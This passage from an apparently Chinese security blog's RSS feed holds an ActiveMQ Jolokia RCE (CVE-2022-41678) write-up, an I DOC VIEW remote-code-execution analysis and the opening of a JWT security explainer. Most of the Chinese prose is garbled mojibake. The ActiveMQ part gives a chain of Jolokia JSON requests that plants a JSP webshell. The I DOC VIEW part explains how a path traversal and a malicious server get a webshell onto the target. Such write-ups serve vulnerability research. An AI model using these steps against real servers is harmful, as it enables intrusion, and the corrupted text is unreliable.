&lt;p&gt;æœ‰å¯åŠ¨è‡ªç„¶ä¹Ÿè¦åœæ­¢ï¼Œé€šè¿‡&lt;code&gt;stopRecording&lt;/code&gt;æ–¹æ³•åœæ­¢å½•åˆ¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public boolean stopRecording(long id) {
	MBeanUtils.checkControl();
	return getExistingRecording(id).stop();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½†æ˜¯è¿™ä¸ªå¼€å§‹å’Œç»“æŸå¹¶ä¸èƒ½å°†&lt;code&gt;webshell&lt;/code&gt;åœ°å†…å®¹æ”¾è¿›å»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç”¨&lt;code&gt;setConfiguration&lt;/code&gt;å°†&lt;code&gt;webshell&lt;/code&gt;çš„å†…å®¹ä»¥é…ç½®çš„å½¢å¼å†™å…¥ï¼Œé‚£ä¹ˆé…ç½®ä»å“ªé‡Œæ¥å‘¢ï¼Œå°±ä»&lt;code&gt;getConfigurations&lt;/code&gt;æ¥å’¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public List&amp;lt;ConfigurationInfo&amp;gt; getConfigurations() {
        MBeanUtils.checkMonitor();
        return MBeanUtils.transformList(Configuration.getConfigurations(), ConfigurationInfo::new);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;copyToè¿™ä¸ªæ–¹æ³•ç”¨æ¥å°†å½•åˆ¶çš„å†…å®¹å†™å…¥æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ¬æ¬¡æ¼æ´çš„æœ€åä¸€æ­¥ï¼Œå†™å…¥JSP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public void copyTo(long recording, String path) throws IOException {
	Objects.requireNonNull(path);
	MBeanUtils.checkControl();
	getExistingRecording(recording).dump(Paths.get(path));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®˜æ–¹ä¹Ÿå†™å¾—å¾ˆæ˜ç™½ï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™è¿™æ ·å†™å°±è¡Œäº†ï¼š
![image-20231201003418727](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003418727.png)
é‚£ä¹ˆåˆ©ç”¨æ–¹å¼ä¹Ÿå¾ˆæ¸…æ™°äº†ï¼šåˆ›å»ºå½•åˆ¶--è®¾ç½®é…ç½®--å¯åŠ¨å½•åˆ¶--ç»“æŸå½•åˆ¶--å†™å…¥æ–‡ä»¶
è‡³äºå½•åˆ¶çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬è¦å†™å…¥çš„shelläº†ã€‚
é‚£ä¹ˆå°±å¼€å§‹å§ï¼Œé¦–å…ˆæ–°å»ºä¸€ä¸ªå½•åˆ¶ï¼Œä¸éœ€è¦æ¥å—å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿæ²¡åŠ ï¼Œè¿”å›å€¼ä¸­çš„&lt;code&gt;value&lt;/code&gt;å°±æ˜¯&lt;code&gt;id&lt;/code&gt;å€¼ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;jdk.management.jfr:type=FlightRecorder&quot;,&quot;operation&quot;:&quot;newRecording&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003423284](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003423284.png)
![image-20231201003425810](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003425810.png)
ç„¶åè·å–é…ç½®ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œæ³¨æ„è¿™é‡Œç”¨&lt;code&gt;read&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&quot;type&quot;:&quot;read&quot;,&quot;mbean&quot;:&quot;jdk.management.jfr:type=FlightRecorder&quot;,&quot;operation&quot;:&quot;getConfigurations&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003429100](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003429100.png)
![image-20231201003432288](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003432288.png)
ä¿®æ”¹ï¼ŒåŠ å…¥&lt;code&gt;webshell&lt;/code&gt;ï¼š
![image-20231201003437020](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003437020.png)
å†™å…¥ï¼Œæ ¹æ®æ–¹æ³•æ¥å—çš„å‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯&lt;code&gt;id&lt;/code&gt;ä¹Ÿå°±æ˜¯é‚£ä¸ª1ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ä¿®æ”¹å¥½çš„é…ç½®æ–‡ä»¶å†…å®¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;jdk.management.jfr:type=FlightRecorder&quot;,&quot;operation&quot;:&quot;setConfiguration&quot;,&quot;arguments&quot;: [1,&quot;xml&quot;]}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003440454](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003440454.png)
![image-20231201003443369](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003443369.png)
å¼€å§‹&amp;amp;ç»“æŸå½•åˆ¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;jdk.management.jfr:type=FlightRecorder&quot;,&quot;operation&quot;:&quot;startRecording&quot;,&quot;arguments&quot;: [1]}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;{&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;jdk.management.jfr:type=FlightRecorder&quot;,&quot;operation&quot;:&quot;stopRecording&quot;,&quot;arguments&quot;: [1]}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003446643](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003446643.png)
![image-20231201003449380](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003449380.png)
![image-20231201003452343](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003452343.png)
![image-20231201003455192](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003455192.png)
å¯¼å‡ºæ–‡ä»¶ï¼š
![image-20231201003457991](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003457991.png)
![image-20231201003500883](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003500883.png)
è®¿é—®ä¸€ä¸‹éªŒè¯ï¼š
![image-20231201003504748](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003504748.png)&lt;/p&gt;
&lt;h2&gt;æ€»ç»“&lt;/h2&gt;
&lt;p&gt;æ„Ÿè§‰æ¯æ¬¡æœ‰ä¸€äº›åº•å±‚çš„å¤§æ›´æ–°æœ‰æ–°ç‰¹æ€§çš„æ—¶å€™éƒ½ä¼šå‡ºä¸€äº›å®‰å…¨é—®é¢˜ï¼Œè¿™æ¬¡æ˜¯&lt;code&gt;ActiveMQ 5.16.x&lt;/code&gt;å¼€å§‹æ”¯æŒJava11ï¼Œæ‰€ä»¥å¯ä»¥ä»è¿™äº›æ–¹é¢å…¥æ‰‹ï¼Œçœ‹çœ‹æ–°ç‰¹æ€§èƒ½ä¸èƒ½é«˜äº›äº‹æƒ…ã€‚
æ­¤å¤–è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å¼ä¸æ­¢JDKçš„&lt;code&gt;MBean&lt;/code&gt;ä¸€ç§ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ä¸€äº›ç¬¬ä¸‰æ–¹çš„&lt;code&gt;MBean&lt;/code&gt;æ¥getshellï¼Œå…·ä½“çš„æ–¹å¼å°±è¯·å¸ˆå‚…ä»¬è‡ªå·±ç ”ç©¶ä¸‹å•¦~&lt;/p&gt;
</content:encoded></item><item><title>I DOC VIEW å‰å°RCE</title><link>https://www.springkill.club/posts/i-doc-view-%E5%89%8D%E5%8F%B0rce/</link><guid isPermaLink="true">https://www.springkill.club/posts/i-doc-view-%E5%89%8D%E5%8F%B0rce/</guid><pubDate>Fri, 24 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I DOC VIEWæ˜¯ä¸€ä¸ªåœ¨çº¿çš„æ–‡æ¡£æŸ¥çœ‹å™¨ï¼Œå…¶ä¸­çš„&lt;code&gt;/html/2word&lt;/code&gt;æ¥å£å› ä¸ºå¤„ç†ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥è¿œç¨‹è¯»å–ä»»æ„æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªæ¥å£å¯¼è‡´æœåŠ¡å™¨ä¸‹è½½æ¶æ„çš„JSPè¿›è¡Œè§£æï¼Œä»è€ŒRCEã€‚&lt;/p&gt;
&lt;h2&gt;æ¼æ´å½±å“ç‰ˆæœ¬&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;20231115&lt;/code&gt;ä¹‹å‰ç‰ˆæœ¬&lt;/p&gt;
&lt;h2&gt;æºç åˆ†æ&lt;/h2&gt;
&lt;p&gt;å…ˆå®šä½åˆ°é—®é¢˜æ¥å£ï¼š
![image-20231124002943513](./I DOC VIEW å‰å°RCE/image-20231124002943513.png)
æ¥å£é‡Œé¢å°±ä¸€ä¸ªæ–¹æ³•&lt;code&gt;toWord&lt;/code&gt;ï¼Œé‚£ä¹ˆå°±æ¥çœ‹çœ‹å®ƒåšäº†ä»€ä¹ˆï¼š
![image-20231124002951105](./I DOC VIEW å‰å°RCE/image-20231124002951105.png)
å‰é¢çš„å†…å®¹ä¸æ˜¯ç‰¹åˆ«ç´§è¦ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå»çˆ¬å–é¡µé¢çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯å”¯ä¸€ä½¿ç”¨äº†&lt;code&gt;url&lt;/code&gt;å‚æ•°çš„åœ°æ–¹ï¼š
![image-20231124002957766](./I DOC VIEW å‰å°RCE/image-20231124002957766.png)
è¿™é‡Œä½¿ç”¨äº†&lt;code&gt;getPage&lt;/code&gt;æ–¹æ³•æ¥å¤„ç†&lt;code&gt;obj&lt;/code&gt;ï¼Œè€Œ&lt;code&gt;obj&lt;/code&gt;åˆæ˜¯&lt;code&gt;url&lt;/code&gt;æ¥çš„&lt;code&gt;URL&lt;/code&gt;å¯¹è±¡ï¼Œä½†æ˜¯ç–‘æƒ‘çš„æ—¶æ–‡ä»¶ååªèƒ½æ˜¯&lt;code&gt;index.html&lt;/code&gt;æ‰€ä»¥å»çœ‹ä¸€ä¸‹è¿™ä¸ª&lt;code&gt;getWebPage&lt;/code&gt;æ–¹æ³•ï¼š
![image-20231124003004867](./I DOC VIEW å‰å°RCE/image-20231124003004867.png)
å…¶å®åˆ°ä¸Šé¢è¿™é‡Œè¿˜å¥½ï¼Œéƒ½æ˜¯ä¸€äº›å†™æ–‡ä»¶çš„æ“ä½œï¼Œå¹¶ä¸”å†™çš„ä¹Ÿæ˜¯&lt;code&gt;index.html&lt;/code&gt;ä½†æ˜¯ä¸‹é¢åšçš„æ“ä½œå°±æ˜¯æœ¬æ­¤æ¼æ´çš„å…³é”®äº†ï¼Œè½¯ä»¶æœ¬æ„åº”è¯¥æ˜¯æƒ³åšä¸€ä¸ªæ¯”è¾ƒå®Œå–„çš„çˆ¬è™«ï¼Œæ‰€ä»¥æ¥ä¸‹ä¼šè°ƒç”¨&lt;code&gt;GrabUtility.searchForNewFilesToGrab&lt;/code&gt;æ–¹æ³•ç»§ç»­è§£ææ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œçš„&lt;code&gt;conn&lt;/code&gt;ä¹Ÿå°±æ˜¯åˆšæ‰åˆ›å»ºçš„é“¾æ¥ï¼š
![image-20231124003010469](./I DOC VIEW å‰å°RCE/image-20231124003010469.png)
è¿›å…¥åˆ°&lt;code&gt;GrabUtility.searchForNewFilesToGrab&lt;/code&gt;æŸ¥çœ‹ï¼Œå‘ç°å…¶ä¸­çš„å†…å®¹å°±æ˜¯è§£æå“åº”å€¼ï¼Œå…¶ä¸­è·å–&lt;code&gt;link[href]&lt;/code&gt;ã€&lt;code&gt;script[src]&lt;/code&gt;ã€&lt;code&gt;img[src]&lt;/code&gt;æ ‡ç­¾å¯¹åº”çš„å†…å®¹ç„¶åå­˜è¿›&lt;code&gt;GrabUtility&lt;/code&gt;çš„æˆå‘˜å˜é‡&lt;code&gt;filesToGrab&lt;/code&gt;ä¸­ï¼š
![image-20231124003017471](./I DOC VIEW å‰å°RCE/image-20231124003017471.png)
![image-20231124003025552](./I DOC VIEW å‰å°RCE/image-20231124003025552.png)
ç„¶åå°±åˆ°äº†è§¦å‘æ¼æ´çš„æ“ä½œäº†ï¼Œè¿™é‡Œè¯»å–äº†&lt;code&gt;filesToGrab&lt;/code&gt;çš„&lt;code&gt;size&lt;/code&gt;ç„¶åå¼€å§‹å°è¯•æŒ¨ä¸ªé“¾æ¥ä¸‹è½½äº†ï¼Œè¿™é‡Œè°ƒç”¨äº†&lt;code&gt;GetWebPage&lt;/code&gt;é‡è½½æ–¹æ³•ï¼Œç›®å½•è¿˜æ˜¯åŸæ¥çš„ç›®å½•ï¼Œæ–‡ä»¶åæ—¶è‡ªåŠ¨è§£æçš„æ–‡ä»¶åï¼š
![image-20231124003032209](./I DOC VIEW å‰å°RCE/image-20231124003032209.png)
![image-20231124003039291](./I DOC VIEW å‰å°RCE/image-20231124003039291.png)
è¿™å°±å¥½åŠäº†ï¼Œå› ä¸ºç¨‹åºä¸­åªå¯¹åç¼€åšäº†è¿‡æ»¤ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬ä¸æ˜¯å®ƒé»‘åå•çš„åç¼€ç„¶åå†é…åˆ&lt;code&gt;ç›®å½•ç©¿è¶Š&lt;/code&gt;å°±è¡Œäº†ï¼Œç„¶åé»‘åå•æ˜¯&lt;code&gt;html&lt;/code&gt;ã€&lt;code&gt;htm&lt;/code&gt;ã€&lt;code&gt;php&lt;/code&gt;ã€&lt;code&gt;asp&lt;/code&gt;ã€&lt;code&gt;aspx&lt;/code&gt;å’Œ&lt;code&gt;net&lt;/code&gt;ï¼Œä½†æ˜¯æ²¡æœ‰&lt;code&gt;jsp&lt;/code&gt;ï¼Œæ‰€ä»¥åªéœ€è¦å†™ä¸ª&lt;code&gt;jsp&lt;/code&gt;çš„ğŸå°±å¯ä»¥äº†ã€‚
è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæˆªå–&lt;code&gt;/&lt;/code&gt;åçš„å†…å®¹ä½œä¸ºæ–‡ä»¶åï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨&lt;code&gt;/&lt;/code&gt;è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä½†æ˜¯ç³»ç»Ÿæ˜¯&lt;code&gt;windows&lt;/code&gt;ä¸Šçš„ï¼Œæ‰€ä»¥å°±å¯ä»¥ä½¿ç”¨&lt;code&gt;\&lt;/code&gt;æ¥ä»£æ›¿ã€‚
é‚£ä¹ˆåˆ©ç”¨æµç¨‹å°±æ˜¯ï¼šé¦–å…ˆå¯åŠ¨æ¶æ„æœåŠ¡å™¨ï¼Œå°†æœåŠ¡å™¨çš„&lt;code&gt;index.html&lt;/code&gt;ä¸­æ”¾å…¥ä¸€ä¸ª&lt;code&gt;href&lt;/code&gt;ã€&lt;code&gt;img&lt;/code&gt;æˆ–è€…&lt;code&gt;script&lt;/code&gt;å®šå‘åˆ°&lt;code&gt;jsp&lt;/code&gt;é©¬å°±è¡Œäº†ï¼ï¼ˆè¿™ä¹Ÿå°è¯äº†é€šå‘Šä¸­çš„&lt;code&gt;è¯±å¯¼&lt;/code&gt;ä¸‹è½½å±é™©æ–‡ä»¶)&lt;/p&gt;
&lt;h2&gt;å¤ç°&lt;/h2&gt;
&lt;p&gt;pocæˆ‘æ”¾åœ¨äº†&lt;a href=&quot;https://github.com/springkill/idocv_poc&quot;&gt;è¿™é‡Œ&lt;/a&gt;ï¼Œè¯¦ç»†åˆ†æ­¥å¤ç°è¯·çœ‹ä¸‹æ–‡ï¼š&lt;/p&gt;
&lt;p&gt;æ„é€ é¡µé¢ï¼š
![image-20231124003048041](./I DOC VIEW å‰å°RCE/image-20231124003048041.png)
&lt;code&gt;python&lt;/code&gt;å¯åŠ¨ç®€æ˜“&lt;code&gt;http&lt;/code&gt;ï¼Œè®¿é—®ï¼
ç„¶åè¢«æ€ï¼ˆè°¢è°¢ä½ ç«ç»’ï¼š
![image-20231124003055195](./I DOC VIEW å‰å°RCE/image-20231124003055195.png)
å…³äº†ç«ç»’ï¼ˆå› ä¸ºæœåŠ¡è²Œä¼¼ä¼šæœ‰ç¼“å­˜ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸ªç«¯å£ï¼‰ï¼š
![image-20231124003100746](./I DOC VIEW å‰å°RCE/image-20231124003100746.png)
æµ‹è¯•ï¼š
![image-20231124003109465](./I DOC VIEW å‰å°RCE/image-20231124003109465.png)
å½“ç„¶æœ€åä¸è¦å¿˜è®°æ‰“å¼€ç«ç»’å“¦ã€‚&lt;/p&gt;
&lt;h2&gt;ç»“è¯­&lt;/h2&gt;
&lt;p&gt;æ–‡ä»¶æ“ä½œæ˜¯ååˆ†æ•æ„Ÿçš„æ“ä½œï¼Œå°¤å…¶æ˜¯å‘æœåŠ¡å™¨ä¸­ä¸‹è½½æ–‡ä»¶ï¼ŒåŒæ—¶ä¸‹è½½çš„æ–‡ä»¶æœ€å¥½ä¹Ÿæœ‰å›ºå®šçš„ç›®å½•å­˜æ”¾å¹¶é˜²æ­¢ç›®å½•ç©¿è¶Šï¼Œå¼€å‘è€…å·²ç»æƒ³åˆ°äº†ä¸‹è½½æ–‡ä»¶çš„é£é™©ï¼Œä½†æ˜¯å´æ²¡æœ‰å°†å¯¹ç­–åšå¥½ï¼Œå¯¼è‡´äº†æœ¬æ¬¡æ¼æ´ã€‚&lt;/p&gt;
&lt;h2&gt;å½©è›‹&lt;/h2&gt;
&lt;p&gt;å¤©çŸ¥é“æˆ‘è¯•äº†å¤šå°‘æ¬¡â€¦â€¦
![image-20231124003114768](./I DOC VIEW å‰å°RCE/image-20231124003114768.png)&lt;/p&gt;
</content:encoded></item><item><title>æµ…è°ˆJWTå®‰å…¨</title><link>https://www.springkill.club/posts/%E6%B5%85%E8%B0%88jwt%E5%AE%89%E5%85%A8/</link><guid isPermaLink="true">https://www.springkill.club/posts/%E6%B5%85%E8%B0%88jwt%E5%AE%89%E5%85%A8/</guid><pubDate>Wed, 22 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;JWTæ˜¯ä¸ºäº†è§£å†³HTTPä¼šè¯çš„çŠ¶æ€ç»´æŒéœ€è¦é¢‘ç¹æŸ¥è¯¢æ•°æ®åº“è¿™ä¸€æ…¢æ“ä½œè€Œäº§ç”Ÿçš„ï¼Œå’Œredisä¸åŒï¼Œå®ƒå°†å¤§éƒ¨åˆ†ï¼ˆæˆ–å…¨éƒ¨ï¼‰ä¿¡æ¯ä¿å­˜åœ¨JWTè‡ªèº«ä¸­ï¼Œé€šè¿‡å¯¹JWTçš„è§£æç›´æ¥è·å–ä¼šè¯çš„çŠ¶æ€ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¹Ÿäº§ç”Ÿäº†ä¸€äº›å®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2&gt;å®šä¹‰&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Json web token (ç®€ç§°JWT)ï¼Œæ˜¯ç›®å‰æœ€æµè¡Œçš„è·¨åŸŸè®¤è¯è§£å†³æ–¹æ¡ˆï¼Œæ˜¯ä¸€ç§è®¤è¯æˆæƒæœºåˆ¶ã€‚
JWT æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†ã€‚è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;JWTç»„æˆ&lt;/h2&gt;
&lt;p&gt;JWT ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œæ¯éƒ¨åˆ†ä¹‹é—´ç”¨ç‚¹&lt;code&gt;.&lt;/code&gt;éš”å¼€ï¼Œè¿™ä¸‰éƒ¨åˆ†åˆ†åˆ«æ˜¯&lt;code&gt;header&lt;/code&gt;ã€&lt;code&gt;payload&lt;/code&gt;ã€&lt;code&gt;Signature&lt;/code&gt;ã€‚
æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªJWTæ¥è¯¦ç»†è§‚å¯Ÿä¸€ä¸‹å®ƒçš„ç»“æ„ï¼š
&lt;code&gt;JWTeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&lt;/code&gt;.&lt;code&gt;eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ&lt;/code&gt;.&lt;code&gt;MZiW2KkIRI6GhKsu16Me7-3IpS4nBw1W47CW67QAqS0&lt;/code&gt;
æ­£å¦‚å‰é¢è¯´çš„ä¸€æ ·ï¼ŒJWTåˆ†ä¸ºä»¥&lt;code&gt;.&lt;/code&gt;éš”å¼€çš„ä¸‰æ®µï¼Œå¹¶ä¸”ä½¿ç”¨äº†&lt;code&gt;base64url&lt;/code&gt;ç¼–ç è¿›è¡Œç¼–ç &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;base64urlç¼–ç å°†base64ä¸­çš„&lt;code&gt;+&lt;/code&gt;æ›¿æ¢ä¸º&lt;code&gt;-&lt;/code&gt;ï¼Œå°†&lt;code&gt;/&lt;/code&gt;æ›¿æ¢ä¸º&lt;code&gt;_&lt;/code&gt;å¹¶ä¸”çœç•¥äº†&lt;code&gt;=&lt;/code&gt;ï¼Œè¿™æ ·ä¸»è¦æ˜¯ä¸ºäº†é¿å…æ­§ä¹‰ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è§£ç åçš„ä¸‰æ®µæ•°æ®åˆ†åˆ«ä¸ºï¼š
&lt;code&gt;{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}&lt;/code&gt;
&lt;code&gt;{&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;John Doe&quot;,&quot;iat&quot;:1516239022}&lt;/code&gt;
&lt;code&gt;Signature&lt;/code&gt;
&lt;img src=&quot;./%E6%B5%85%E8%B0%88JWT%E5%AE%89%E5%85%A8/image-20231122014746811.png&quot; alt=&quot;image-20231122014746811&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;header&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;header&lt;/code&gt;ä¸­çš„ä¸¤ä¸ªå†…å®¹å¾ˆå¥½ç†è§£ï¼Œä¸€ä¸ªæ˜¯è§„å®šäº†æ ¼å¼ä¸º&lt;code&gt;JWT&lt;/code&gt;ï¼Œå¦ä¸€ä¸ªæŒ‡å®šç­¾åç®—æ³•ä¸º&lt;code&gt;HS256&lt;/code&gt;ï¼Œ&lt;code&gt;header&lt;/code&gt;ä¸­é€šå¸¸ä¹Ÿåªæœ‰è¿™ä¸¤ä¸ªå­—æ®µï¼Œå…¶ä¸­&lt;code&gt;typ&lt;/code&gt;ä¸å˜ï¼Œæ°¸è¿œéƒ½æ˜¯&lt;code&gt;JWT&lt;/code&gt;ï¼Œ&lt;code&gt;alg&lt;/code&gt;å­—æ®µä¼šæ ¹æ®æ‰€ä½¿ç”¨çš„ç­¾åç®—æ³•ä¸åŒè€Œæ”¹å˜ï¼Œæœ‰æ—¶è¿˜ä¼šæœ‰&lt;code&gt;jwk&lt;/code&gt;å­—æ®µï¼ˆè¿™ä¸ªä¹Ÿæˆä¸ºäº†ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼‰ã€‚&lt;/p&gt;
&lt;h3&gt;payload&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;payload&lt;/code&gt;ä¸­åŒ…å«ä¸‰éƒ¨åˆ†å†…å®¹ï¼šæ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜ã€å…¬å…±çš„å£°æ˜å’Œç§æœ‰çš„å£°æ˜ã€‚
æ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;iss&lt;/code&gt;: jwtç­¾å‘è€…&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sub&lt;/code&gt;: jwtæ‰€é¢å‘çš„ç”¨æˆ·&lt;/li&gt;
&lt;li&gt;&lt;code&gt;aud&lt;/code&gt;: æ¥æ”¶jwtçš„ä¸€æ–¹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exp&lt;/code&gt;: jwtçš„è¿‡æœŸæ—¶é—´ï¼Œè¿™ä¸ªè¿‡æœŸæ—¶é—´å¿…é¡»è¦å¤§äºç­¾å‘æ—¶é—´&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nbf&lt;/code&gt;: å®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iat&lt;/code&gt;: jwtçš„ç­¾å‘æ—¶é—´&lt;/li&gt;
&lt;li&gt;&lt;code&gt;jti&lt;/code&gt;: jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡»ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å…¬å…±çš„å£°æ˜ ï¼š å…¬å…±çš„å£°æ˜å¯ä»¥æ·»åŠ ä»»ä½•çš„ä¿¡æ¯ï¼Œä¸€èˆ¬æ·»åŠ ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯æˆ–å…¶ä»–ä¸šåŠ¡éœ€è¦çš„å¿…è¦ä¿¡æ¯.ä½†ä¸å»ºè®®æ·»åŠ æ•æ„Ÿä¿¡æ¯ï¼Œå› ä¸ºè¯¥éƒ¨åˆ†åœ¨å®¢æˆ·ç«¯å¯è§£å¯†.
ç§æœ‰çš„å£°æ˜ ï¼š ç§æœ‰å£°æ˜æ˜¯æä¾›è€…å’Œæ¶ˆè´¹è€…æ‰€å…±åŒå®šä¹‰çš„å£°æ˜ï¼Œä¸€èˆ¬ä¸å»ºè®®å­˜æ”¾æ•æ„Ÿä¿¡æ¯ï¼Œå› ä¸ºbase64æ˜¯å¯¹ç§°è§£å¯†çš„ï¼Œæ„å‘³ç€è¯¥éƒ¨åˆ†ä¿¡æ¯å¯ä»¥å½’ç±»ä¸ºæ˜æ–‡ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;h3&gt;Signature&lt;/h3&gt;
&lt;p&gt;ç­¾åæ˜¯JWTçš„æœ€åä¸€éƒ¨åˆ†ï¼Œç”Ÿæˆæ–¹å¼å’Œä¸Šé¢å›¾ç‰‡ä¸­è“è‰²å­—æ®µå†™çš„ä¸€æ ·ï¼Œå…¶ä¸­&lt;code&gt;secret&lt;/code&gt;å­—æ®µæ˜¯ä¸€ä¸ªå¯†é’¥ï¼Œé€šè¿‡è¿™ä¸ªå¯†é’¥è¿›è¡ŒåŠ å¯†åçš„æ•°æ®å†&lt;code&gt;base64url&lt;/code&gt;ç¼–ç å°±å¾—åˆ°äº†JWTä¸­çš„æœ€åä¸€éƒ¨åˆ†å†…å®¹ã€‚&lt;/p&gt;
&lt;h2&gt;å®‰å…¨é—®é¢˜&lt;/h2&gt;
&lt;h3&gt;æ•æ„Ÿä¿¡æ¯æ³„éœ²&lt;/h3&gt;
